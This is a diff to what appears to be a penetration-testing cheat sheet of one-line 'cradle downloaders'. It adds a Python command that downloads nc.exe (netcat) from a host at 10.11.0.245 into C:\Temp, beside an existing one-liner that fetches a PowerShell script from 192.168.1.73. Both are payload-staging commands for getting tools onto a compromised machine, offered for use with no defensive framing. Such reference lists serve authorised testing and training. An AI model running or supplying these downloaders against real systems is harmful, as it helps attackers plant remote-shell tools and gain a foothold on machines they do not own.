@@ -2135,6 +2135,8 @@ This section contains onelinner crandle downloaders that for one reason or anoth
 <br /><br />
 **Python Downloaders**<br />
 
+      python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
+
       #!/usr/bin/python;import urllib2;u = urllib2.urlopen('http://192.168.1.73/hello.ps1');localFile = open('local_file', 'w');localFile.write(u.read());localFile.close()
 
 <br /><br />
